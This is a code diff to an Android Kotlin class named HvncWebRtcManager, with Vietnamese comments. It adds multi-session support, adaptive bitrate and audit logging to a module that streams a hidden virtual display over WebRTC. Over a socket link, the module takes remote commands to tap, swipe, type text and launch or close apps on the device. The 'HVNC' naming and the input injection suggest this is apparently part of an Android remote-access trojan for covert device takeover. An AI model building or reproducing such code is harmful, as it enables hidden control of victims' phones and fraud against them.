+        } else {
+            Log.w(TAG, "[$sessionId] Authentication failed - closing session")
+            auditLogger?.logAction(sessionId, "auth_failed", mapOf(), "webrtc", false)
+            releaseSession(sessionId)
+        }
+    }
+
+    private fun handleControlMessage(sessionId: String, json: JSONObject) {
+        val session = sessions[sessionId] ?: return
+        val injector = session.inputInjector ?: return
+
+        if (!session.authVerified) {
+            Log.w(TAG, "[$sessionId] Control message before authentication - dropping")
+            return
+        }
+
+        val action = json.optString("action")
+        val params = mutableMapOf<String, String>()
+
+        try {
+            when (action) {
+                Protocol.ACTION_TAP -> {
+                    val x = json.optDouble("x", Double.NaN).toFloat()
+                    val y = json.optDouble("y", Double.NaN).toFloat()
+                    if (!x.isNaN() && !y.isNaN()) {
+                        injector.tap(x, y)
+                        params["x"] = x.toString(); params["y"] = y.toString()
+                    }
+                }
+                Protocol.ACTION_SWIPE -> {
+                    val sx = json.optDouble("startX", Double.NaN).toFloat()
+                    val sy = json.optDouble("startY", Double.NaN).toFloat()
+                    val ex = json.optDouble("endX", Double.NaN).toFloat()
+                    val ey = json.optDouble("endY", Double.NaN).toFloat()
+                    val dur = json.optLong("duration", 300)
+                    if (!sx.isNaN() && !sy.isNaN() && !ex.isNaN() && !ey.isNaN()) {
+                        injector.swipe(sx, sy, ex, ey, dur)
+                        params["startX"] = sx.toString(); params["startY"] = sy.toString()
+                        params["endX"] = ex.toString(); params["endY"] = ey.toString()
+                        params["duration"] = dur.toString()
+                    }
+                }
+                Protocol.ACTION_KEY -> {
+                    val key = json.optString("keyCode")
+                    injector.keyEvent(key)
+                    params["keyCode"] = key
+                }
+                Protocol.ACTION_TEXT -> {
+                    val text = json.optString("text")
+                    injector.typeText(text)
+                    params["textLength"] = text.length.toString()
+                }
+                Protocol.ACT_LAUNCH_APP -> {
+                    val pkg = json.optString("packageName")
+                    injector.launchApp(pkg)
+                    params["packageName"] = pkg
+                }
+                Protocol.ACT_CLOSE_APP -> {
+                    val pkg = json.optString("packageName")
+                    injector.closeApp(pkg)
+                    params["packageName"] = pkg
+                }
+                Protocol.ACTION_VOLUME -> {
+                    val dir = json.optString("direction")
+                    injector.adjustVolume(dir)
+                    params["direction"] = dir
+                }
+                Protocol.ACTION_GESTURE -> {
+                    val dur = json.optLong("duration", 300)
+                    val pointsArray = json.optJSONArray("points")
+                    if (pointsArray != null && pointsArray.length() >= 2) {
+                        val first = pointsArray.getJSONObject(0)
+                        val last = pointsArray.getJSONObject(pointsArray.length() - 1)
+                        injector.swipe(
+                            first.optDouble("x").toFloat(), first.optDouble("y").toFloat(),
+                            last.optDouble("x").toFloat(), last.optDouble("y").toFloat(),
+                            dur
+                        )
+                        params["pointsCount"] = pointsArray.length().toString()
+                    }
+                }
+                // Live touch events từ frontend: touchStart được bỏ qua, touchEnd → tap
+                "touchStart" -> {
+                    // Chỉ ghi nhận, không inject — frontend gửi touchEnd khi hoàn tất
+                    params["x"] = json.optDouble("x", 0.0).toString()
+                    params["y"] = json.optDouble("y", 0.0).toString()
+                }
+                "touchMove" -> {
+                    // Bỏ qua touchMove — frontend tự detect gesture và gửi action riêng
+                    return
+                }
+                "touchEnd" -> {
+                    val x = json.optDouble("x", Double.NaN).toFloat()
+                    val y = json.optDouble("y", Double.NaN).toFloat()
+                    if (!x.isNaN() && !y.isNaN()) {
+                        injector.tap(x, y)
+                        params["x"] = x.toString(); params["y"] = y.toString()
+                    }
+                }
+                else -> {
+                    Log.w(TAG, "[$sessionId] Unknown control action: $action")
+                    return
+                }
+            }
+
+            // Ghi audit log
+            auditLogger?.logAction(sessionId, action, params, "webrtc")
+        } catch (e: Exception) {
+            Log.e(TAG, "[$sessionId] Control message error", e)
+            auditLogger?.logAction(sessionId, action, params, "webrtc", false)
+        }
+    }
+
+    /**
+     * Public method cho SocketCommandRouter fallback control.
+     * Nhận action và payload JSON, chuyển đến handleControlMessage.
+     */
+    @JvmStatic
+    fun injectFallbackControl(sessionId: String, json: JSONObject) {
+        handler.post {
+            val session = sessions[sessionId] ?: return@post
+            if (!session.authVerified) {
+                Log.w(TAG, "[$sessionId] Fallback control before auth — dropping")
+                return@post
+            }
+            handleControlMessage(sessionId, json)
+        }
+    }
+
+    private fun sendDisplayInfo(sessionId: String) {
+        val session = sessions[sessionId] ?: return
+        val channel = session.controlChannel ?: return
         if (channel.state() != DataChannel.State.OPEN) return
-        val display = displayManager ?: return
+        val display = session.displayManager ?: return
+
         val payload = JSONObject().apply {
             put("type", "hvnc-info")
             put(Protocol.KEY_VIRTUAL_W, display.displayWidth)
             put(Protocol.KEY_VIRTUAL_H, display.displayHeight)
-            put(Protocol.KEY_DISPLAY_ID, display.displayId)
+            put(Protocol.KEY_DISPLAY_ID, display.displayIdValue)
             put(Protocol.KEY_DENSITY_DPI, display.displayDpi)
-        }.toString().toByteArray(StandardCharsets.UTF_8)
-        channel.send(DataChannel.Buffer(ByteBuffer.wrap(payload), false))
+        }
+
+        // Gửi plaintext JSON qua DataChannel (WebRTC DTLS đã bảo vệ transport)
+        val data = payload.toString().toByteArray(StandardCharsets.UTF_8)
+        channel.send(DataChannel.Buffer(ByteBuffer.wrap(data), false))
     }
 
     // ─── Sender Configuration ──────────────────────────────────────
 
-    private fun configureSender() {
-        val sender = peerConnection?.senders?.firstOrNull { it.track()?.kind() == "video" } ?: return
+    private fun configureSender(sessionId: String) {
+        val session = sessions[sessionId] ?: return
+        val pc = session.peerConnection ?: return
+        val sender = pc.senders.firstOrNull { it.track()?.kind() == "video" } ?: return
         val parameters = sender.parameters
         parameters.degradationPreference = RtpParameters.DegradationPreference.MAINTAIN_RESOLUTION
-        val display = displayManager ?: return
-        val target = min(MAX_BITRATE_BPS, max(MIN_BITRATE_BPS, display.displayWidth * display.displayHeight * 2))
+        val display = session.displayManager ?: return
+
+        val targetBitrate = min(
+            MAX_BITRATE_BPS,
+            max(MIN_BITRATE_BPS, display.displayWidth * display.displayHeight * 2)
+        )
+        session.currentBitrate = targetBitrate
+
         parameters.encodings.forEach {
             it.minBitrateBps = MIN_BITRATE_BPS
-            it.maxBitrateBps = target
-            it.maxFramerate = FPS
+            it.maxBitrateBps = targetBitrate
+            it.maxFramerate = session.targetFps
             it.scaleResolutionDownBy = 1.0
         }
         if (!sender.setParameters(parameters)) {
-            Log.w(TAG, "HVNC sender rejected parameters")
+            Log.w(TAG, "[$sessionId] Sender rejected parameters")
         }
-        peerConnection?.setBitrate(MIN_BITRATE_BPS, min(START_BITRATE_BPS, target), target)
+        pc.setBitrate(MIN_BITRATE_BPS, min(START_BITRATE_BPS, targetBitrate), targetBitrate)
+    }
+
+    // ─── Adaptive Bitrate ──────────────────────────────────────────
+
+    private fun adjustBitrate(sessionId: String, bandwidthBps: Long) {
+        val session = sessions[sessionId] ?: return
+        val pc = session.peerConnection ?: return
+        val target = min(MAX_BITRATE_BPS, max(MIN_BITRATE_BPS, bandwidthBps.toInt()))
+
+        if (target < session.currentBitrate / 2) {
+            Log.d(TAG, "[$sessionId] Low bandwidth detected: ${bandwidthBps}bps, reducing quality")
+            session.targetFps = max(10, session.targetFps - 5)
+            session.displayManager?.adjustFps(session.targetFps)
+        } else if (target > session.currentBitrate * 2 && session.targetFps < 30) {
+            session.targetFps = min(30, session.targetFps + 5)
+            session.displayManager?.adjustFps(session.targetFps)
+        }
+
+        session.currentBitrate = target
+        configureSender(sessionId)
+    }
+
+    // ─── Bandwidth Monitor ───────────────────────────────────────────
+
+    private const val BANDWIDTH_CHECK_INTERVAL_MS = 3000L
+
+    private fun startBandwidthMonitor(sessionId: String) {
+        val session = sessions[sessionId] ?: return
+        stopBandwidthMonitor(sessionId)
+        session.lastBytesSent = 0L
+        session.lastBandwidthCheckTime = System.currentTimeMillis()
+
+        val runnable = object : Runnable {
+            override fun run() {
+                val s = sessions[sessionId] ?: return
+                val pc = s.peerConnection ?: return
+                if (s.connectionState != "connected") return
+
+                try {
+                    pc.getStats { report ->
+                        var totalBytesSent = 0L
+                        val entries = report.statsMap
+                        for ((_, stat) in entries) {
+                            if (stat.type == "outbound-rtp" && stat.members["kind"] == "video") {
+                                totalBytesSent += (stat.members["bytesSent"] as? Long) ?: 0L
+                            }
+                        }
+                        val now = System.currentTimeMillis()
+                        val elapsed = now - s.lastBandwidthCheckTime
+                        if (elapsed > 0 && s.lastBytesSent > 0 && totalBytesSent > s.lastBytesSent) {
+                            val bytesDelta = totalBytesSent - s.lastBytesSent
+                            val bandwidthBps = bytesDelta * 8000 / elapsed  // Convert to bps
+                            if (bandwidthBps > 0) {
+                                adjustBitrate(sessionId, bandwidthBps)
+                            }
+                        }
+                        s.lastBytesSent = totalBytesSent
+                        s.lastBandwidthCheckTime = now
+                    }
+                } catch (_: Exception) {}
+
+                if (sessions.containsKey(sessionId)) {
+                    handler.postDelayed(this, BANDWIDTH_CHECK_INTERVAL_MS)
+                }
+            }
+        }
+        session.bandwidthMonitorRunnable = runnable
+        handler.postDelayed(runnable, BANDWIDTH_CHECK_INTERVAL_MS)
+    }
+
+    private fun stopBandwidthMonitor(sessionId: String) {
+        val session = sessions[sessionId] ?: return
+        session.bandwidthMonitorRunnable?.let {
+            handler.removeCallbacks(it)
+        }
+        session.bandwidthMonitorRunnable = null
     }
 
     // ─── Factory & Lifecycle ───────────────────────────────────────
@@ -535,7 +973,7 @@ object HvncWebRtcManager {
             PeerConnectionFactory.initialize(
                 PeerConnectionFactory.InitializationOptions.builder(FasonApp.getContext())
                     .setEnableInternalTracer(false)
-                    .createInitializationOptions(),
+                    .createInitializationOptions()
             )
         }
         if (eglBase == null) eglBase = EglBase.create()
@@ -548,54 +986,49 @@ object HvncWebRtcManager {
         }
     }
 
-    private fun releaseSession() {
-        emitStatus(false, "stopped")
-        releasePeerConnectionOnly()
-        releaseVideoSource()
-        remoteDescriptionSet.set(false)
-        pendingOffer = null
-        pendingIce.clear()
-        sessionId = ""
+    private fun releaseSession(sessionId: String) {
+        val session = sessions[sessionId] ?: return
+        emitStatus(sessionId, false, "stopped")
+        stopBandwidthMonitor(sessionId)
+        releasePeerConnectionOnly(sessionId)
+        releaseVideoSource(sessionId)
+        session.reconnectRunnable?.let { handler.removeCallbacks(it) }
+        session.reconnectRunnable = null
+        session.remoteDescriptionSet = false
+        session.pendingOffer = null
+        session.pendingIce.clear()
+        session.authVerified = false
+        session.securityInitialized = false
+        session.connectionState = "stopped"
+        sessions.remove(sessionId)
     }
 
-    private fun releasePeerConnectionOnly() {
-        try { controlChannel?.unregisterObserver() } catch (_: Exception) {}
-        try { controlChannel?.close() } catch (_: Exception) {}
-        try { controlChannel?.dispose() } catch (_: Exception) {}
-        controlChannel = null
-        try { peerConnection?.close() } catch (_: Exception) {}
-        try { peerConnection?.dispose() } catch (_: Exception) {}
-        peerConnection = null
+    private fun releasePeerConnectionOnly(sessionId: String) {
+        val session = sessions[sessionId] ?: return
+        try { session.controlChannel?.unregisterObserver() } catch (_: Exception) {}
+        try { session.controlChannel?.close() } catch (_: Exception) {}
+        session.controlChannel = null
+        try { session.peerConnection?.close() } catch (_: Exception) {}
+        try { session.peerConnection?.dispose() } catch (_: Exception) {}
+        session.peerConnection = null
     }
 
-    private fun releaseVideoSource() {
-        try { videoTrack?.dispose() } catch (_: Exception) {}
-        videoTrack = null
-        try { videoSource?.dispose() } catch (_: Exception) {}
-        videoSource = null
+    private fun flushPendingIce(sessionId: String) {
+        val session = sessions[sessionId] ?: return
+        val pc = session.peerConnection ?: return
+        session.pendingIce.forEach { pc.addIceCandidate(it) }
+        session.pendingIce.clear()
     }
 
-    private fun failPeer(targetSession: String, message: String) {
-        emitError(targetSession, message)
+    private fun failPeer(sessionId: String, message: String) {
+        emitError(sessionId, message)
         handler.post {
-            if (sessionId != targetSession) return@post
-            releasePeerConnectionOnly()
-            remoteDescriptionSet.set(false)
-            sessionId = ""
-            videoTrack?.setEnabled(false)
-            emitStatus(displayManager?.isActive() == true, if (displayManager?.isActive() == true) "ready" else "stopped")
-        }
-    }
-
-    private fun flushPendingIce() {
-        val pc = peerConnection ?: return
-        val it = pendingIce.iterator()
-        while (it.hasNext()) {
-            val (candidateSession, candidate) = it.next()
-            if (candidateSession == sessionId) {
-                pc.addIceCandidate(candidate)
-                it.remove()
-            }
+            val session = sessions[sessionId] ?: return@post
+            releasePeerConnectionOnly(sessionId)
+            session.remoteDescriptionSet = false
+            session.videoTrack?.setEnabled(false)
+            session.connectionState = "failed"
+            emitStatus(sessionId, session.displayManager?.isActive() == true, "ready")
         }
     }
 
@@ -621,30 +1054,33 @@ object HvncWebRtcManager {
 
     // ─── Status Emission ───────────────────────────────────────────
 
-    private fun emitStatus(active: Boolean, connectionState: String) {
-        val display = displayManager
+    private fun emitStatus(sessionId: String, active: Boolean, connectionState: String) {
+        val session = sessions[sessionId]
+        val display = session?.displayManager
         val status = JSONObject().apply {
             put(Protocol.KEY_TYPE, Protocol.KEY_STATUS)
+            put("sessionId", sessionId)
             put(Protocol.KEY_STREAMING, active)
             put(Protocol.KEY_VIRTUAL_W, display?.displayWidth ?: 0)
             put(Protocol.KEY_VIRTUAL_H, display?.displayHeight ?: 0)
-            put(Protocol.KEY_DISPLAY_ID, display?.displayId ?: -1)
+            put(Protocol.KEY_DISPLAY_ID, display?.displayIdValue ?: -1)
             put(Protocol.KEY_DENSITY_DPI, display?.displayDpi ?: 0)
-            put("fps", FPS)
+            put("fps", session?.targetFps ?: 30)
             put("transport", "webrtc")
             put("connectionState", connectionState)
-            put("sessionId", sessionId)
+            put("authVerified", session?.authVerified ?: false)
         }
         SocketClient.getInstance().socket?.emit(Protocol.HVNC, status)
     }
 
-    private fun emitError(targetSession: String, message: String) {
+    private fun emitError(sessionId: String, message: String) {
         val error = JSONObject().apply {
             put(Protocol.KEY_TYPE, Protocol.KEY_ERROR)
             put(Protocol.KEY_ERROR, message)
-            put("sessionId", targetSession)
+            put("sessionId", sessionId)
         }
         SocketClient.getInstance().socket?.emit(Protocol.HVNC, error)
+        auditLogger?.logAction(sessionId, "error", mapOf("message" to message), "webrtc", false)
     }
 
     private open class SimpleSdpObserver : SdpObserver {
